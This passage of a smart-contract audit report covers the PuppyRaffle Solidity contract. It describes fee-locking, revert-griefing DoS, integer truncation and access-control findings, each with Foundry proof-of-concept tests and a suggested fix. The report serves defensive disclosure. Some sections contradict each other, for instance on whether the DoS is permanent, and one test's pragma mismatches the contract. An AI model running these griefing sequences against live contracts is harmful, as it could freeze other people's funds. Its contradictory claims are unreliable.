    totalFees = totalFees + uint64(fee);

    // ... rest of the function ...
}
```

## [M-6]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function requires that the contract's entire ETH balance is exactly equal to the `totalFees` accumulated. The `totalFees` variable is cumulative across multiple raffle rounds, but after a winner is paid, the contract's balance only holds the fees from the most recent round. Furthermore, if a new raffle starts and players enter before fees are withdrawn, the contract's balance will increase, making the condition `address(this).balance == uint256(totalFees)` impossible to meet. This flawed logic will almost certainly lead to fees being permanently locked in the contract after the first round.

Vulnerable Code:
```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;

    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
Any address can grief the protocol by entering the next raffle with fewer than 4 players and then never refunding. This keeps `players.length < 4`, so `selectWinner()` cannot be executed and `totalFees` can never be withdrawn because `address(this).balance > totalFees`. The already-accrued protocol revenue becomes indefinitely locked, causing a permanent loss unless the griefer willingly refunds. No funds are stolen but the protocol’s earnings are frozen.

## Proof of Concept
1. A full raffle round finishes and `fee_round1` is added to `totalFees`.
2. The owner does **not** call `withdrawFees()` immediately.
3. A malicious user calls `enterRaffle` with **one** address and sends `entranceFee`.
   • `players.length == 1` (< 4), so `selectWinner()` can never succeed.
   • Only the player herself can call `refund()`, so the owner cannot remove her.
4. Now `address(this).balance == totalFees + entranceFee`, therefore `withdrawFees()` reverts forever with
   "PuppyRaffle: There are currently players active!".
5. All fees collected so far are stuck in the contract for as long as the attacker refuses to refund, i.e. indefinitely.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract FeeLockTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDR = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDR, 60);
    }

    // helper – fills the raffle with 4 players and ends it
    function _finishRound() internal {
        for (uint256 i = 1; i <= 4; i++) {
            address p = address(uint160(i));
            vm.deal(p, ENTRANCE_FEE);
            vm.prank(p);
            address[] memory arr = new address[](1);
            arr[0] = p;
            raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        }
        vm.warp(block.timestamp + 61); // raffle duration passed
        raffle.selectWinner();
    }

    function testFeesArePermanentlyLockedByGriefer() public {
        _finishRound(); // fees from round-1 now inside contract
        uint256 fees = raffle.totalFees();
        assertGt(fees, 0);

        // Griefer enters alone
        address griefer = address(0xBEEF);
        vm.deal(griefer, ENTRANCE_FEE);
        vm.prank(griefer);
        address[] memory arr = new address[](1);
        arr[0] = griefer;
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        // Attempt to withdraw – should revert because balance > totalFees
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The check in `withdrawFees` should be removed. The function should simply withdraw the amount tracked by `totalFees` and reset the counter. To prevent draining funds from active players, it should be callable only by the owner.

```diff
-   function withdrawFees() external {
+   function withdrawFees() external onlyOwner {
-       require(
-           address(this).balance == uint256(totalFees),
-           "PuppyRaffle: There are currently players active!"
-       );
        uint256 feesToWithdraw = totalFees;
+       require(address(this).balance >= feesToWithdraw, "PuppyRaffle: Not enough balance to withdraw fees");
        totalFees = 0;

        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

## [M-7]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function is vulnerable to two Denial of Service (DoS) vectors. 
1. **Revert Griefing**: If the winner is a contract designed to revert when receiving Ether, the `winner.call{value: prizePool}('')` will fail. Since state changes to start a new raffle happen after this call, the function will be permanently stuck, locking all funds in the contract.
2. **Unbounded Gas Cost**: The function calls `delete players` to clear the array for the next round. If the `players` array becomes very large, the gas cost of this operation can exceed the block gas limit, making it impossible to successfully call `selectWinner` and conclude the raffle.

## Impact
A malicious participant whose address reverts on receive can make the `selectWinner` transaction revert whenever they are drawn as the winner. While the raffle can still be concluded once some caller hits a block/timestamp for which another player wins, repeated failed attempts waste gas and can discourage users from continuing the raffle, temporarily locking funds. Therefore the impact is a grief-only, temporary DoS, not a permanent loss of funds.

## Proof of Concept
1. Attacker deploys a contract with a receive function that always reverts.
2. Attacker joins the raffle together with at least three other honest EOAs (to satisfy the `>=4 players` requirement).
3. Anyone can keep calling `selectWinner`; whenever the hash `(msg.sender, block.timestamp, block.difficulty) % players.length` resolves to the attacker's index the low-level `winner.call{value: prizePool}()` returns `false` and the whole transaction reverts, forcing the caller to pay for the failing gas.
4. The attacker (or a bot) can keep triggering such failing attempts cheaply by pre-computing an input timestamp that yields its index, producing a practical yet non-permanent DoS.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RevertingReceiver {
    receive() external payable { revert("evil"); }
}

contract PuppyRaffle_DoS_Test is Test {
    PuppyRaffle raffle;
    RevertingReceiver bad;
    address alice = address(0xA1);
    address bob   = address(0xB0);
    address carl  = address(0xC0);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 60);
        bad = new RevertingReceiver();

        // compose the player list (4 distinct addresses)
        address payable[] memory players = new address payable[](4);
        players[0] = payable(address(bad));
        players[1] = payable(alice);
        players[2] = payable(bob);
        players[3] = payable(carl);
        raffle.enterRaffle{value: 4 ether}(players);
    }

    function test_revertGriefing() public {
        vm.warp(block.timestamp + 61);

        // find a timestamp that makes the malicious player win
        uint256 maliciousIndex = 0; // bad is at index 0 in `players` array
        for (uint256 i = 0; i < 256; i++) {
            uint256 candidateTs = block.timestamp + i;
            uint256 winnerIdx = uint256(keccak256(abi.encodePacked(address(this), candidateTs, block.difficulty))) % 4;
            if (winnerIdx == maliciousIndex) {
                vm.warp(candidateTs);
                vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
                raffle.selectWinner();
                return;
            }
        }
        fail("could not force malicious winner within 256 seconds window");
    }
}

## Suggested Mitigation
Adopt the pull-over-push pattern: store the winner and prize amount, then let the winner call `claimPrize()` to withdraw. This removes external calls from `selectWinner` and eliminates the DoS vector. The current `delete players` statement is already constant-cost; no change is required there.

## [M-8]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the `fee` is calculated as a `uint256` but then down-cast to a `uint64` before being added to `totalFees`. If the calculated fee for a single round exceeds the maximum value of a `uint64` (`2^64 - 1`), the value will be truncated, leading to an incorrect and much smaller amount being added to `totalFees`. This can happen if the `entranceFee` and number of players are sufficiently large.

For example, if `entranceFee` is 1 ether (1e18) and there are 100 players, `totalAmountCollected` is 100 ether. The fee is 20 ether (20e18). `type(uint64).max` is approximately 18.4e18. The value `20e18` will be truncated upon conversion to `uint64`, causing `totalFees` to be credited with a much smaller value than what was actually collected.

Vulnerable Code:
```solidity
function selectWinner() external {
    // ...
    uint256 totalAmountCollected = players.length * entranceFee;
    // ...
    uint256 fee = (totalAmountCollected * 20) / 100;

    // fee is a uint256, totalFees is a uint64. This is a truncating down-cast.
    totalFees = totalFees + uint64(fee);
    // ...
}
```

## Impact
The `totalFees` variable will not accurately represent the true amount of fees collected by the protocol. When `withdrawFees` is called, it will only withdraw the smaller, incorrectly recorded amount. The remaining portion of the fees will be permanently locked in the contract.

## Proof of Concept
1. Deploy the contract with an `entranceFee` of 1 ether.
2. Have 100 players enter the raffle.
3. The `totalAmountCollected` will be 100 ether.
4. The `fee` will be calculated as 20 ether (`20 * 10^18`).
5. `type(uint64).max` is `~18.4 * 10^18`. The `uint64(fee)` conversion will truncate `20 * 10^18` to `20 * 10^18 % 2^64`, which is `1554832595888742400` (`~1.55e18`), not `20e18`.
6. `totalFees` will now hold `~1.55` ether, while the contract's balance holds 20 ether in fees. The difference of `~18.45` ether is now unaccounted for and cannot be withdrawn.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract IntegerTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            60
        );
    }

    function testFeeTruncation() public {
        // Have 100 players enter.
        uint256 numPlayers = 100;
        address[] memory singlePlayer = new address[](1);
        for(uint i = 0; i < numPlayers; i++) {
            address player = address(uint160(i + 1));
            singlePlayer[0] = player;
            vm.deal(player, entranceFee);
            vm.prank(player);
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }

        vm.warp(block.timestamp + 61);
        puppyRaffle.selectWinner();

        uint256 feeAmount = (numPlayers * entranceFee * 20) / 100; // Should be 20 ether
        console.log("Actual Fee Calculated (uint256):", feeAmount);
        assertEq(feeAmount, 20 ether);

        uint64 totalFeesTracked = puppyRaffle.totalFees();
        console.log("Fee Tracked in totalFees (uint64):", totalFeesTracked);

        // The tracked fee is much smaller due to truncation.
        assertTrue(totalFeesTracked < feeAmount);
        assertEq(totalFeesTracked, uint64(feeAmount)); // Proves truncation

        uint256 contractBalance = address(puppyRaffle).balance;
        console.log("Contract ETH Balance:", contractBalance);

        // The contract balance correctly holds the 20 ether fee.
        assertEq(contractBalance, feeAmount);

        // The difference is locked forever.
        assertTrue(contractBalance > totalFeesTracked);
    }
}
```

## Suggested Mitigation
The `totalFees` state variable should be changed from `uint64` to `uint256` to prevent truncation and potential overflow when adding the fee. This ensures that the contract can handle large fee amounts without data loss.

```diff
contract PuppyRaffle is ERC721, Ownable {
    // ...
    address public feeAddress;
-   uint64 public totalFees;
+   uint256 public totalFees;

    // ...

    function selectWinner() external {
        // ...
        uint256 fee = (totalAmountCollected * 20) / 100;

-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;

        // ...
    }

    // ...
}
```

## [M-9]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The contract is compiled with Solidity 0.7.6, which does not have built-in protection against integer overflows/underflows. In the `selectWinner` function, calculations for `prizePool` and `fee` are performed using multiplication before division: `(totalAmountCollected * 80) / 100`. If `totalAmountCollected` is large enough (e.g., `(type(uint256).max / 80) + 1`), the intermediate multiplication `totalAmountCollected * 80` will overflow, resulting in a much smaller value. This leads to an incorrect, and tiny, prize pool. Additionally, `totalFees` is a `uint64`, and the addition `totalFees = totalFees + uint64(fee)` can overflow if the total fees collected exceed the max value of `uint64`.

## Impact
Because totalFees is stored as a uint64, once the protocol has accumulated more than 18.446 ETH in fees (2^64-1 wei) the addition in selectWinner() will wrap. When this happens, `totalFees` becomes smaller than the real ether balance that sits in the contract. The next call to `withdrawFees()` will revert on

require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

Consequently the owner can never withdraw fees again and every subsequent raffle keeps locking new ether in the contract. No player funds are at risk, but all protocol revenue becomes permanently stuck.

## Proof of Concept
1. Deploy PuppyRaffle with entranceFee = 10 ether, raffleDuration = 1 second.
2. Run three raffles with 4 different players each (40 ether collected per raffle, 8 ether fees per raffle):
   • after raffle 1 : totalFees = 8 ether
   • after raffle 2 : totalFees = 16 ether
   • after raffle 3 : addition 8 ether causes uint64 wrap → totalFees ≈ 0.5 ether ( 24 ether held by contract )
3. Call withdrawFees(). It reverts because `address(this).balance` (24 ether) ≠ wrapped `totalFees`.

All protocol fees are now irretrievable while new raffles keep adding more locked ether.

## Proof of Code
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract TotalFeesOverflowTest is Test {
    PuppyRaffle raffle;
    address feeAddr = makeAddr("feeAddr");
    uint256 entrance = 10 ether; // 10 ETH per ticket

    function setUp() public {
        raffle = new PuppyRaffle(entrance, feeAddr, 1); // 1-second raffles
        vm.deal(address(this), 200 ether);
    }

    function _runRaffle() internal {
        // create four fresh players
        address[] memory p = new address[](4);
        for (uint256 i; i < 4; ++i) {
            p[i] = makeAddr(string(abi.encodePacked("player", i, block.timestamp)));
        }
        // enter raffle (40 ether total)
        raffle.enterRaffle{value: 4 * entrance}(p);
        vm.warp(block.timestamp + 2);
        raffle.selectWinner();
    }

    function test_totalFeesWrapsAndLocksEther() public {
        _runRaffle(); // fees = 8 ether
        _runRaffle(); // fees = 16 ether
        _runRaffle(); // fee addition overflows uint64 (wrap)

        // Contract now holds 24 ether but totalFees is below that amount.
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Store `totalFees` as uint256 and perform arithmetic with checked math (SafeMath for <0.8 or pragma ^0.8.0). Example:

uint256 public totalFees;
...
prizePool = (totalAmountCollected * 80) / 100;
fee       = (totalAmountCollected * 20) / 100;
unchecked { totalFees += fee; }

(If compiled with Solidity ≥0.8 you may omit the `unchecked{}` or keep it depending on desired revert behaviour.)



# Low Risk Findings

## [L-1]. Pausable Emergency Stop issue in PuppyRaffle::NA

## Description
The contract lacks an emergency stop or pause mechanism. If a critical vulnerability (like the identified integer overflow or potential reentrancy) is discovered after deployment, the owner has no way to halt the contract's operations. Malicious actors could continue to interact with the vulnerable functions, potentially leading to further financial loss or contract malfunction. The only owner-restricted function is `changeFeeAddress`, which is insufficient for managing a crisis.

## Impact
Because the contract has no circuit–breaker, the owner cannot temporarily stop user-facing functions if an unforeseen bug or economic attack is found after deployment. While this absence does not by itself steal or lock funds, it removes an important operational safety-valve and can enlarge the damage window of any future bug.

## Proof of Concept
1. Deploy PuppyRaffle.
2. Owner tries to pause the contract using the conventional `pause()` interface many projects expose:
   `(bool success, ) = address(raffle).call(abi.encodeWithSignature("pause()"));`
   `success` is false because the selector does not exist.
3. Any externally owned account can still call `enterRaffle` or `selectWinner` without hindrance, proving there is no way to halt the contract in an emergency.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract LackOfPauseTest is Test {
    PuppyRaffle raffle;
    address feeAddress = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddress, 1); // 1-second raffle for test
    }

    function test_NoPauseFunction() public {
        // Owner (msg.sender) attempts to pause the contract
        (bool success, ) = address(raffle).call(abi.encodeWithSignature("pause()"));
        assertTrue(!success, "pause() unexpectedly exists");

        // Prove contract is still callable
        address[] memory addrs = new address[](1);
        addrs[0] = address(1);
        raffle.enterRaffle{value: 1 ether}(addrs); // should succeed because no pause mechanism
    }
}

## Suggested Mitigation
Implement a pausable mechanism using OpenZeppelin's `Pausable` contract. This will allow the owner to halt key functions (`enterRaffle`, `selectWinner`, `refund`) in an emergency.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/Pausable.sol"; // Import Pausable

// Inherit from Pausable
contract PuppyRaffle is ERC721, Ownable, Pausable {
    // ...

    // Add pause and unpause functions callable only by owner
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    // Add the `whenNotPaused` modifier to critical functions
    function enterRaffle(address[] memory newPlayers) public payable virtual whenNotPaused {
        // ...
    }

    function refund(uint256 playerIndex) public virtual whenNotPaused {
        // ...
    }

    function selectWinner() external virtual whenNotPaused {
        // ...
    }
}

```

## [L-2]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
In the `enterRaffle` function, the duplicate check loop `for (uint256 i = 0; i < players.length - 1; i++)` is vulnerable to an integer underflow. If the function is called when `players.length` is 0, the expression `players.length - 1` underflows to `type(uint256).max`. This causes the loop to run a virtually infinite number of times, consuming all transaction gas and causing it to revert. An attacker can trigger this by calling `enterRaffle` with an empty array of new players.

## Impact
Calling `enterRaffle` with an empty `newPlayers` array causes the duplicate-check loop bound `players.length - 1` to underflow when the raffle has no players. The call will consume all provided gas and revert. No state is modified and subsequent, well-formed calls with at least one player proceed normally, so the issue is limited to wasted gas for the caller and does **not** prevent others from using the raffle.

## Proof of Concept
1. The `PuppyRaffle` contract is newly deployed, so the `players` array is empty (`players.length == 0`).
2. An attacker calls `enterRaffle` with an empty `newPlayers` array `[]` and `msg.value` of 0.
3. The first loop for adding players is skipped.
4. The second loop for duplicate checks evaluates its condition: `i < players.length - 1` becomes `i < 0 - 1`.
5. The subtraction underflows, and the condition becomes `i < type(uint256).max`.
6. The transaction immediately runs out of gas and reverts.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffle_Overflow_Test is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDRESS = address(0xdeadbeef);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 1 days);
    }

    function testUnderflowCausesOOG() public {
        address[] memory empty;
        // Expect the call to revert for *any* reason (out-of-gas produces no data)
        vm.expectRevert();
        raffle.enterRaffle{gas: 100_000}(empty); // give bounded gas to avoid hanging the test runner
    }
}


## Suggested Mitigation
Add an early check that `newPlayers.length > 0` or wrap the duplicate loop with `if (players.length > 1)` to avoid evaluating `players.length - 1` when there are fewer than two players.

## [L-3]. Access Control issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function is responsible for transferring collected fees to the `feeAddress`. This function lacks any access control, such as an `onlyOwner` modifier. As a result, any external account can call this function at any time. While the check `require(address(this).balance == uint256(totalFees), ...)` prevents this call during an active raffle, it can be successfully called by anyone after a raffle has ended and the winner has been paid, at which point the contract balance will equal `totalFees`.

## Impact
Any externally owned account can front-run or arbitrarily trigger fee withdrawals once a raffle has finished. While this does not redirect or steal the funds (they are still sent to `feeAddress`), it removes the owner’s discretion over when withdrawals occur, breaking expected admin control and potentially complicating accounting or batching of multiple raffles.

## Proof of Concept
1. A raffle is run and completes successfully.
2. The winner calls `selectWinner`, and the prize pool is transferred to them.
3. The contract balance is now equal to the value of `totalFees`.
4. An arbitrary attacker calls `withdrawFees()`.
5. The call succeeds, and the fees are transferred to `feeAddress`, without the owner's initiation.

## Proof of Code
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract AccessControlTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = makeAddr("fee");
    uint256 raffleDuration = 1 days;

    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");
    address player3 = makeAddr("player3");
    address player4 = makeAddr("player4");
    address attacker = makeAddr("attacker");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        vm.deal(address(this), 10 ether);

        address[] memory players = new address[](4);
        players[0] = player1; players[1] = player2; players[2] = player3; players[3] = player4;
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(players);
    }

    function test_AnyoneCanWithdrawFees() public {
        vm.warp(block.timestamp + raffleDuration + 1);
        puppyRaffle.selectWinner();

        uint256 fees = puppyRaffle.totalFees();
        assert(fees > 0);
        assertEq(address(puppyRaffle).balance, fees);

        uint256 feeAddressBalanceBefore = feeAddress.balance;

        // Attacker calls withdrawFees
        vm.prank(attacker);
        puppyRaffle.withdrawFees();

        assertEq(feeAddress.balance, feeAddressBalanceBefore + fees);
        assertEq(address(puppyRaffle).balance, 0);
        assertEq(puppyRaffle.totalFees(), 0);
    }
}

## Suggested Mitigation
Add the `onlyOwner` modifier to the `withdrawFees` function to ensure that only the contract owner can initiate the fee withdrawal process.

```solidity
// src/PuppyRaffle.sol:156-165
function withdrawFees() external onlyOwner {
    // ... function body ...
}
```

## [L-4]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees

## Description
Several critical functions that alter state and move funds do not emit events. Specifically, `selectWinner` determines a winner, transfers the prize pool, and resets the raffle, but no event is emitted to log this outcome. Similarly, `withdrawFees` allows the owner to transfer all collected fees, but this action is not logged on-chain with an event. This lack of event emission reduces transparency and makes it difficult for users and off-chain monitoring tools to track the contract's lifecycle and key activities.

## Impact
The absence of events for significant actions makes the contract opaque. It becomes hard for users to verify raffle outcomes, for front-ends to display activity history, and for security tools to monitor for malicious or anomalous behavior. This erodes trust and complicates any potential incident analysis.

## Proof of Concept
1. Call the `selectWinner` function.
2. Observe the transaction logs on a block explorer like Etherscan.
3. Note that while `Transfer` events for the NFT minting are present (from ERC721), there is no custom event like `WinnerSelected` that indicates who won, the prize amount, or the new raffle starting.
4. Call `withdrawFees`.
5. Observe the transaction logs and note the absence of an event like `FeesWithdrawn`.

## Proof of Code
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract NoEventTest is Test {
    PuppyRaffle raffle;
    address owner = address(0xBEEF);
    address payable feeAddr = payable(address(0xFEE));
    address player1 = address(1);
    address player2 = address(2);
    address player3 = address(3);
    address player4 = address(4);

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.startPrank(owner);
        raffle = new PuppyRaffle(1 ether, feeAddr, 1); // raffleDuration = 1 second
        vm.stopPrank();

        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(player4, 10 ether);
    }

    function _enter(address p) internal {
        address[] memory arr = new address[](1);
        arr[0] = p;
        vm.prank(p);
        raffle.enterRaffle{value: 1 ether}(arr);
    }

    function test_noWinnerSelectedEvent() public {
        _enter(player1);
        _enter(player2);
        _enter(player3);
        _enter(player4);

        // Fast-forward so raffle is over
        vm.warp(block.timestamp + 2);

        vm.recordLogs();
        raffle.selectWinner();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        bytes32 expectedTopic = keccak256("WinnerSelected(address,uint256,uint256)");
        bool found;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == expectedTopic) {
                found = true;
            }
        }
        assertFalse(found, "WinnerSelected event should not exist");
    }
}

## Suggested Mitigation
Define and emit events for all critical state-changing functions.

```solidity
// Add event declarations
event WinnerSelected(address indexed winner, uint256 prize, uint256 tokenId);
event FeesWithdrawn(address indexed to, uint256 amount);

// In selectWinner()
// ... after prize calculation and before the external call ...
_safeMint(winner, tokenId);
emit WinnerSelected(winner, prizePool, tokenId);

// In withdrawFees()
function withdrawFees() external {
    // ... require check ...
    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
    emit FeesWithdrawn(feeAddress, feesToWithdraw);
}
```



# Info Risk Findings

## [I-1]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
Several critical state-changing actions in the contract do not emit events. Specifically, `selectWinner` executes the entire winner selection, prize distribution, and NFT minting process without emitting any event. Similarly, `withdrawFees` transfers all collected fees to the `feeAddress` without an event. This lack of event emission makes it difficult for off-chain services, monitoring tools, and users to track the contract's most important activities. It harms transparency and observability.

## Impact
While this issue does not lead to a direct loss of funds, it severely hinders the usability and trustworthiness of the protocol. DApp front-ends, analytics platforms, and users cannot easily track raffle outcomes or fee withdrawals. They would need to resort to complex and unreliable methods like tracing transactions, which is inefficient and not standard practice.

## Proof of Concept
1. A user participates in the raffle.
2. The raffle period ends, and another user calls `selectWinner`.
3. The first user wants to know if they won. They check their wallet for the prize and the NFT, but what if they want to see the history of all winners?
4. There is no `WinnerSelected` event to subscribe to. The only way to find the winner is to call the `previousWinner` view function, which only shows the most recent winner, or to parse the internal transactions of the `selectWinner` call.
5. This makes building a transparent 'Past Winners' list on a website difficult and inefficient.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract EventConsistencyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 60;
    address feeAddress;
    address owner;

    function setUp() public {
        owner = msg.sender;
        feeAddress = makeAddr("feeAddress");
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);

        address[] memory players = new address[](4);
        for(uint i = 0; i < 4; i++) {
            players[i] = makeAddr(string(abi.encodePacked("player", vm.toString(i))));
        }
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
    }

    function test_SelectWinner_LacksEvent() public {
        // We expect no custom events from `selectWinner` other than ERC721 `Transfer`.
        // We will check the log count to demonstrate this.
        vm.recordLogs();
        puppyRaffle.selectWinner();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // The only event emitted is the ERC721 Transfer event.
        // A `WinnerSelected` event is missing.
        assertEq(logs.length, 1); // Only Transfer(address(0), winner, tokenId)
        bytes32 transferTopic = keccak256("Transfer(address,address,uint256)");
        assertEq(logs[0].topics[0], transferTopic);
    }

    function test_WithdrawFees_LacksEvent() public {
        // Setup: run a raffle to generate fees
        puppyRaffle.selectWinner();

        // We expect no events from `withdrawFees`.
        vm.prank(owner);
        vm.recordLogs();
        puppyRaffle.withdrawFees();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // No event is emitted.
        assertEq(logs.length, 0);
    }
}
```

## Suggested Mitigation
Add events for all critical state changes. This improves transparency and allows for easier integration with off-chain services.

```solidity
// In PuppyRaffle.sol

// Define new events
event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId);
event FeesWithdrawn(address indexed to, uint256 amount);

function selectWinner() external {
    // ... existing logic up to prize calculation ...
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    // ...

    // Emit the event before external calls
    emit WinnerSelected(winner, prizePool, tokenId);

    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
}

function withdrawFees() external {
    // ... existing logic ...
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;

    // Emit event before external call
    emit FeesWithdrawn(feeAddress, feesToWithdraw);

    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [I-2]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses a floating pragma `pragma solidity ^0.7.6;`. This allows the contract to be compiled with any compiler version from 0.7.6 up to, but not including, 0.8.0. Deploying a contract with a different compiler version than the one it was tested with can introduce unexpected behavior or bugs, as compiler-generated bytecode may differ. It also harms deterministic build processes.

## Impact
The use of a floating pragma can lead to the contract being deployed with a slightly different and untested compiler version, which may introduce subtle bugs. This reduces the overall security assurance of the deployed code.

## Proof of Concept
1. A developer writes and tests the contract using Solidity compiler version 0.7.6.
2. A deployment script or a third-party platform uses a newer compiler, say 0.7.9, to compile the contract before deployment.
3. If version 0.7.9 has a bug or a change in how it generates bytecode for certain opcodes, the deployed contract may not behave exactly as the tested contract did.
4. This discrepancy could lead to security vulnerabilities or operational failures.

## Proof of Code
NA

## Suggested Mitigation
Lock the pragma to a specific Solidity version that the contract has been developed and tested with. This ensures that the contract is always compiled with the intended compiler, producing deterministic bytecode.

```solidity
//- pragma solidity ^0.7.6;
//+ pragma solidity 0.7.6;
```

## [I-3]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses `pragma solidity 0.7.6;`. While using a fixed pragma is good practice, version 0.7.6 is outdated. Since its release, numerous bugs have been fixed in the Solidity compiler, and important security features, such as built-in overflow/underflow protection (introduced in 0.8.0), have been added. Using an old compiler version may expose the contract to known vulnerabilities that have since been patched.

## Impact
Compiling with an old version of Solidity may introduce subtle bugs or security vulnerabilities that have been fixed in newer versions. It also prevents the use of modern language features that improve code safety and clarity. In this specific contract, the lack of default overflow checks in <0.8.0 is directly related to the `IntegerMath` vulnerability found.

## Proof of Concept
1. Review the `PuppyRaffle.sol` file.
2. Observe the line `pragma solidity 0.7.6;`.
3. Compare this version to the latest stable release of Solidity (e.g., 0.8.2x).
4. Note the significant number of bug fixes and security improvements listed in the Solidity release notes between 0.7.6 and the latest version.

## Proof of Code
```solidity
// No code needed. The proof is the pragma line in the contract itself.
// File: src/PuppyRaffle.sol
// pragma solidity 0.7.6;
```

## Suggested Mitigation
It is recommended to use a more recent and stable version of the Solidity compiler. Upgrading to a version >= 0.8.0 is highly encouraged as it provides automatic overflow and underflow checks.

```diff
- pragma solidity 0.7.6;
+ pragma solidity ^0.8.20;
```
Note: Upgrading to 0.8.x is a breaking change and will require code modifications to be compliant with the new version (e.g., explicit type conversions, changes in `super` calls), but it significantly enhances security.



